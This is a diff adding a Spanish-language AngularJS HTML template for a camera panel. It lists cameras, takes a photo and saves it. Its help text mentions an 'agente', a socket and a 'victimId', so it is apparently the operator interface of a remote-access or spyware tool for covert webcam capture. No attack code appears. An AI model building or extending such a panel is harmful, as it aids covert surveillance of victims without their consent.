@@ -1,0 +1,49 @@
+<div class="ui segment">
+  <h2 class="ui header">Cámara</h2>
+  <div class="ui form">
+
+   
+
+    <div class="field">
+      <label>Selecciona una cámara:</label>
+      <select ng-model="selectedCam"
+              ng-options="cam.id as cam.name for cam in cameras"
+              ng-change="camChanged()">
+        <option value="" disabled>Selecciona...</option>
+      </select>
+    </div>
+
+    <div class="field">
+      <button class="ui labeled icon black button"
+              ng-click="snap()"
+              ng-disabled="!selectedCam || selectedCam === ''">
+        <i class="photo icon"></i>
+        Tomar foto
+      </button>
+    </div>
+
+    <div class="field" ng-if="photo">
+      <label>Foto tomada:</label>
+      <img ng-src="{{photo}}" alt="Foto" class="ui image" style="max-width: 320px; max-height: 320px;">
+      <button class="ui green button" ng-click="savePhoto()" style="margin-top:10px;" ng-if="isSaveShown">
+        <i class="save icon"></i>
+        Guardar foto
+      </button>
+    </div>
+
+    <div class="ui red message" ng-if="camError">
+      {{camError}}
+      <div ng-if="!cameras || cameras.length == 0">
+        <strong>Tip:</strong> Si no se listan cámaras, revisa que el agente esté activo y tenga acceso a hardware de cámara.<br>
+        Si el problema persiste, revisa logs en backend y asegúrate que el victimId sea correcto.<br>
+        <strong>¿El socket está conectado?</strong>
+        {{socket ? (socket.connected ? 'Sí' : 'No') : 'N/A'}}
+      </div>
+    </div>
+
+    <div class="ui info message" ng-if="cameras && cameras.length == 0 && !camError">
+      <strong>No hay cámaras disponibles.</strong> 
+      Verifica que el dispositivo tenga cámaras físicas conectadas, que el agente tenga permisos y que el backend esté enviando la lista correctamente.
+    </div>
+  </div>
+</div>
